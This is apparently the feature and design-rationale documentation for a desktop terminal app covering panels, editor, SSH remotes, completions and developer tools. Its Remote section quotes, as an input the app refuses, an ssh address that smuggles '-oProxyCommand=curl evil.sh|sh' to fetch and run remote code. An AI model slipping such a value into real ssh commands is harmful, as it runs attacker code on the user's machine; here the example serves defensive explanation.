# Features, in full

The README says what JKY Terminal is. This says how each part works and, more
usefully, why it works that way — the arguments that decided the awkward
cases, which are the ones worth writing down.

Every heading here is linked from the README.

---

## Every command can become an app

A shell answers in text because a pipe is the only thing it can answer in. That
has nothing to do with what the answer *is*: `df` reports how full four disks
are, `docker ps` reports the state of five containers, and both are tables that
were flattened on the way out.

So the terminal reads the flattening back. Run a command; if its output has a
shape, a panel appears under it.

| Command | Becomes |
|---|---|
| `mkdir project` | the confirmation it never prints |
| `ls -l` | a listing with kinds, sizes and dates |
| `git status -s` | staged and unstaged, kept apart |
| `git log` | a timeline |
| `df -h` | bars, fullest disk first |
| `ps aux` | a process table |
| `docker ps` | containers, running and stopped |
| anything JSON | laid out |

**No model is involved.** These are parsers. A wrong table presented
confidently is worse than a wall of text, because text is at least honestly
text — so every recogniser refuses more than it accepts and shows nothing the
moment the output stops looking like what it expects.

Three rules make it safe to leave on:

- **It never replaces the output.** The text stays exactly where it was, and
  the panel can be dismissed. A terminal that swallowed what a command printed
  would be unusable the first time it got something wrong — and it will.
- **Actions type a command; nothing runs one.** A panel that could quietly
  `docker stop` would be one you had to trust. This one only has to be read:
  what it does is what you would have typed, and you still press Enter.
- **A pipe means it declines.** `docker ps | grep api` prints grep's output,
  and reading that as docker's would be confidently reading the wrong thing.

It is checked against two real shell sessions — `zsh -i` and `bash -i` driven
through a real pty, seven commands typed, everything recorded. Hand-written
fixtures test what you imagined the output looks like; those test what it is.
The first run found a `git log` line beginning with a stray keypad escape that
silently cost one commit in three.

---

---

## Splits

A tab is **one** terminal until you ask for another. Splitting is deliberate
and stays that way — nothing arrives split, and a layout comes back only
because you saved it in a workspace by name.

| | |
|---|---|
| `Ctrl+Shift+T` | split right — the shifted pair of `Ctrl+T`, which opens a whole terminal |
| `Ctrl+Shift+D` | split **d**own |
| `Ctrl+Shift+W` | close this pane |
| `Ctrl+Shift+←↑↓→` | move between panes |

Moving between panes is geometric, not structural: **right** means the pane
drawn to the right, which is not always the one the layout tree calls a
sibling. Split a tab right, then split the left half down, and *right* from
either left-hand pane reaches the same right-hand one — which is what the eye
expects and what a tree walk gets wrong.

**Resize** by dragging the line between two terminals — fifteen pixels of grab
area for two of drawn line, because a target you have to aim at is a target you
miss. Double-click evens them up. The dividers are focusable too, so arrows
resize and a layout can be built without a mouse at all.

**Move one** by holding <kbd>Ctrl</kbd> and dragging it onto another: the two
exchange places. Held with Ctrl because an unmodified drag inside a terminal is
a text selection and always has been. Only the leaves swap — the shape of the
layout does not change, nothing is re-parented, and no shell is disturbed, so
this is safe to do to a terminal with something running in it.

Each pane keeps its own scrollback across a restart, and closing one forgets
only that one.

---

---

## Editor

CodeMirror 6, with the language loaded only when you open a file that needs
it. Ctrl/Cmd+S saves; an unsaved file shows a dot.

Folders are opened **in the editor**, not in Settings — choosing what to work
on is the work, and a round trip to a settings screen and back is not. Several
can be open at once, each with its own tree, and files from any of them open
side by side.

Files are made, renamed and deleted from the tree — right-click an entry, or
use **+** on a folder's heading. Three rules are enforced in Rust, each with a
test: a new file will not take a name that is already there (that would be
erasing, not creating), a rename will not overwrite another file, and a
directory with anything in it will not be deleted. There is no undo here and
no wastebasket, and the shell is right there for anyone who really means it.

Nothing unsaved leaves without being asked about. Closing a file with changes
**asks**: Save, Discard, or Cancel. Three answers
because there are three things you might mean, and a two-button version makes
one of them unreachable. Escape and clicking away both mean Cancel, so a stray
keystroke never costs anything, and a save that fails leaves the file open —
closing it anyway would be discarding under another name.

**Quitting asks too.** Which files are open lives outside the editor, so
wandering off to the terminal costs the scroll position and nothing else, and
closing the window from any section still knows there is something to lose.

**It can reach the folders you opened and nothing else.** Every path the window
sends is relative to one of them; it never names an absolute one. The boundary
has two halves and both are checked on every call: the root must be a folder
you actually opened, and the path must resolve inside it — checked *after*
canonicalising, so `../` and a symlink pointing out of the tree are refused by
the same rule rather than by a list of tricks somebody thought of. There is a
test for each. Folders are re-resolved per call, so one that was deleted or
unplugged stops working rather than answering for a ghost, and it is shown as
**missing** rather than quietly dropped.

A file it cannot edit still **opens**. An image is drawn; a PDF or anything
else binary opens as a card naming what it is and how big, and every one of
them says plainly that it cannot be edited here. Refusing to open them left
you with an error and an empty pane — no picture, and no explanation either.

PDFs are **drawn**, page by page, by turning each one into a picture. That is
not the obvious way round and it is the only one that works here: handing the
document to the webview would mean widening `frame-src` to accept `data:` — a
hole in the one rule — and the webview this ships against on Linux does not
render PDFs inline anyway.

The renderer is fetched the first time somebody opens a PDF. It is 1.7 MB,
which is far too much to sit in the download of everyone who never opens one,
and it stays out of the entry bundle entirely. Its font and character-map data
is served from the app's own origin, because `connect-src 'self'` is the whole
point and a renderer that wanted a CDN would be one this app could not use.

Reads are text-only and size-capped. An editor that silently rewrote the bytes
it could not decode would corrupt the file on the next save, so a binary is
refused rather than mangled.

This is why the README used to say an editor was not here: Monaco is several
megabytes that ship whether or not anyone opens it. CodeMirror, loaded as its
own chunk with a chunk per language, adds **33 kB** to what everyone
downloads. And the budget that argument rested on is now enforced —
`pnpm run scan:bundle` fails the build if the entry bundle grows past it,
because a sentence in a README is a promise with nothing keeping it.

---

---

## Workspaces

A workspace is not a folder and not a window. It is the answer to *put me back
where I was on that project*: which folders the editor opens, where terminals
start and how many, and which machine, if any. Switching applies all of it at
once and lands you in it.

**Save what is open** makes one out of what you have already arranged, which is
how most of them get made — the arrangement exists, and naming it is the only
step left.

Switching **replaces** the open folders rather than adding to them. A workspace
is where you were, not where you were plus the last project. A folder it names
that is not there is reported and **kept**: a drive that is unplugged is a
folder that comes back, and quietly editing your workspace to remove it would
lose the setup you saved.

A start directory that is not there is **said**, not silently ignored. A pty
falls back to your home directory when a configured directory is missing —
right for spawning, useless as feedback — so it is checked when you set it and
again when you switch, and the switch tells you which part of it could not
happen.

A workspace *names* things; it does not grant them. Opening its folders goes
through exactly the checks that opening one by hand does, so the file — which
is plain JSON you can edit — is a wish rather than a way to read the machine.
The same reasoning bounds how many terminals one can ask for: not a limit of
the terminal, a bound on what one click can do.

---

---

## Remote

A saved host opens a terminal on another machine. It runs the `ssh` your
computer already has, which is the whole design: your agent, your
`~/.ssh/config`, your `known_hosts` and your keys are the ones in use, so a
host that works in any other terminal works here.

**No password field, and no key field.** This app stores no SSH credential and
never sees one. An app that reimplemented SSH would be asking you to trust a
second, younger implementation of the thing standing between you and a
production machine.

The sharp edge is the argument list, and it is the reason `jky-remote` has a
file of its own with its own tests. `ssh` takes its options as arguments, so a
field that reaches the command line unchecked is not a string — it is an
option, and an address of `-oProxyCommand=curl evil.sh|sh` is a documented way
to turn *connect to this host* into *run this on my laptop*. Addresses, users,
key paths and jump hosts are all validated, refused rather than escaped, and
checked when you save as well as when you connect so the two can never
disagree. The destination goes after `--`.

The IPC command takes a host **id**, never a command line: nothing you type in
the window becomes a process argument.

Splitting a remote terminal gives you a local one — which is what you want
when you are looking at a server and need to check something here — and a
remote pane is not restored on the next launch, because bringing the app back
must not reconnect to somebody's production machine on its own.

---

---

## Completions

Start typing and what could come next appears. <kbd>↑</kbd><kbd>↓</kbd> or the
mouse choose one; <kbd>Tab</kbd>, <kbd>Enter</kbd> or a click puts it **on the
prompt**; <kbd>Enter</kbd> again runs it. <kbd>Esc</kbd> dismisses.

Two presses, not one. A completion that ran the moment you picked it would be
one you had to undo rather than read — and the same rule the command panels
follow: what happens is what you would have typed, and you still press Enter.
When the highlighted suggestion is already what is on the prompt there is
nothing to put there, so <kbd>Enter</kbd> goes to the shell and runs the
command instead of doing nothing.

What is offered depends on where the cursor is, so a branch is never offered
where a file belongs:

| Where | What |
|---|---|
| the first word | programs on your `PATH`, then whole lines you have run before |
| `git checkout ` | branches, read from `.git` rather than by running git |
| `git add ` | files, because that is what `git add` takes |
| `npm run ` | the scripts in `package.json`, with what each one runs |
| `cd ` | directories, never a file |
| `-` | that command's flags, with what each is for |
| anything else | paths |

**Nothing is run to find out what to offer.** Not the command being completed,
not `git`, not `--help`. A completion engine that executed something would
execute it on every keystroke, at a prompt where you have not decided yet.

**Nothing is guessed.** A command the app was not told about gets paths and
nothing else — no invented flags. A flag accepted with Tab is a flag nobody
re-reads before pressing Enter, so a wrong one is worse than none. And a
command your machine does not have is not described at all: offering
`docker ps` where docker is not installed is offering something that cannot
work.

The prompt is read off the screen rather than accumulated from keystrokes. A
model built from what you pressed goes wrong the first time you recall a line
with the up arrow — and goes wrong silently.

---

---

## History

Every command that finishes is recorded — what was typed, where it ran, and
how it ended. The shell reports all three through the same hook the command
panels use, so nothing is inferred from what is on screen.

Search is a **subsequence** match, because that is how people remember a
command: `dkrps` finds `docker ps`, and `gcm` finds `git commit -m`. Results
are ranked by how tightly the query matched, how often the command has been
run, and how recently — frequency damped by a logarithm, or an `ls` run five
hundred times would outrank whatever you were actually looking for.

A command appears once however many times it ran, with the count beside it.
Forty identical lines would bury everything else you have ever typed.

Choosing one **types it at the prompt**. It does not run it — the same rule
the command panels follow, and the reason you can browse this without being
careful. **Forget** removes every run of a command rather than the row you are
looking at: someone deleting a line with a credential in it means all of them.

This is not scrollback, and it is a different file. Scrollback is what a
command *printed* — emitted rather than authored, capped and rolling, kept per
terminal. This is what was *typed*: small, yours, and the thing worth finding
a month later.

---

---

## Every shortcut is yours

Settings → **Keyboard** lists all of them and takes a new binding by
listening: you choose a shortcut and press the keys you want. Typing
`Ctrl+Shift+D` into a box would mean agreeing with the app about how a chord
is spelled, and a mistake there is a shortcut that reads correctly and never
fires.

Two rules are enforced in Rust rather than in the panel, which is what makes
them true of a hand-edited `keymap.json` as well:

- **Every binding takes a modifier.** An unmodified key belongs to the shell,
  where every keystroke means something.
- **`Ctrl+C` and `Ctrl+D` cannot be taken.** Not a general reservation of
  shell keys — this app already claims `Ctrl+K` and `Ctrl+W`, and pretending
  otherwise would be theatre. These two are the pair that stop a terminal
  being a terminal: without interrupt a runaway command cannot be stopped,
  and without end-of-input a shell cannot be left.

`Ctrl` means Cmd on a Mac, stored as one modifier rather than two, so a keymap
made on a laptop means the same thing on a desktop. Only your changes are
written down — a default improved in a later release still reaches you.

---

---

## Developer tools

| | Tool | | | Tool |
|---|---|---|---|---|
| `{}` | **JSON** | | `⇄` | **HTTP** |
| `≡` | **YAML** | | `◫` | **System Monitor** |
| `±` | **Diff** | | `☰` | **Processes** |
| `#` | **Hash** | | `$` | **Environment** |
| `⊙` | **JWT** | | `◎` | **DNS** |
| `*` | **Regex** | | | |

Every one opens with what it is for, when you would reach for it, and worked
examples you can load. A test requires it, so a tool added later has to teach
itself too.

Four of them are defined by what they **refuse**:

- **JWT decodes and never verifies.** It has no key, so it must not imply a
  token is good — and `alg: none` is a real attack, where a decoder that
  implied validity would be at its most dangerous.
- **Environment cannot change a terminal already open.** Nothing outside a
  running process can, and "manage your environment variables" is the promise
  every tool like this makes and none keeps.
- **Ending a process says "asked it to stop".** A process may ignore the
  signal. It is the only thing here that changes the machine, so it asks
  first and goes in the audit log.
- **Regex runs in a worker so it can be killed.** `(a+)+$` against a run of
  a's takes longer than the universe, and a regular expression cannot be
  interrupted once started.

---

---

## Accounts

Two apps sign in, both through **your own browser**, never an embedded one.

| | How | What it can do |
|---|---|---|
| **GitHub** | device code, approved on github.com under your own 2FA | read repos, issues, PRs, notifications |
| **Gmail** | authorization code + PKCE, loopback redirect | read your inbox |

No token, code or verifier ever reaches the window. Gmail is `gmail.readonly`
and a test keeps `gmail.send` out; the list never fetches a message body, and
an opened one arrives as text — so nothing in a message can load an image and
report that you read it.

Google needs a client id of your own, and the panel walks you through it. None
ships, because a Google client belongs to whoever made it.

---

---

## Browser

Not an iframe — most of the web refuses to be one. Measured, not assumed:

| Site | Answer |
|---|---|
| GitHub, Jira | `X-Frame-Options: deny` |
| Gmail, Grafana | `DENY` |
| Slack, Notion, Figma, YouTube, Reddit | `SAMEORIGIN` |

So it is a **native child webview** drawn by whatever engine the OS ships —
WebKitGTK, WKWebView, WebView2. Nothing bundled. It cannot call a single Tauri
command, it keeps nothing, and it opens `http` and `https` only.

---

---

## Capture

A camera beside the bell photographs the whole window — rail, status bar, tabs
and whatever is open — and then asks what to do with it. **Save** writes
`jky-terminal-2026-09-09-014210.png` to your downloads folder and tells you
where it went. **Copy** puts it on the clipboard and leaves no file behind.

The picture is taken when you press the button and the choice is offered
afterwards, so the popover is never in the shot.

It is the same code on all three platforms, which took some deciding. Tauri has
no cross-platform way to photograph a webview, and the screen-capture crates
that fill that gap document window capture as unreliable on Wayland — the
default on current Fedora and Ubuntu. So the window renders a picture of
itself: the tree is serialised into an SVG `foreignObject`, drawn to a canvas,
and the live canvases are composited back on top, because a `<canvas>`
serialises as an empty element and the terminal would otherwise arrive as a
hole. Rust still performs every effect — it chooses the path and it owns the
clipboard — so the window is granted no filesystem capability by this feature,
and a test proves it.

The reasoning, and the measurements behind it, are in
[`docs/superpowers/specs/2026-09-09-capture-design.md`](superpowers/specs/2026-09-09-capture-design.md).

One honest caveat: on Wayland a clipboard is served by a live process, so a
copied capture lasts as long as the app does. That is true of every Wayland
application, and a clipboard manager solves it.

---

---

## Themes and motion

Seven themes. A literal hex in a component is a lint error, and a test
computes the WCAG contrast of every theme's text against its own ground.

Nine things move — cursor, panels, spinners, progress, typing, a status pulse,
tabs, notifications, a game starting. `prefers-reduced-motion` is honoured by
**one** rule for the whole app, and a test pins that: a per-rule guard is one
somebody eventually forgets.

---

---
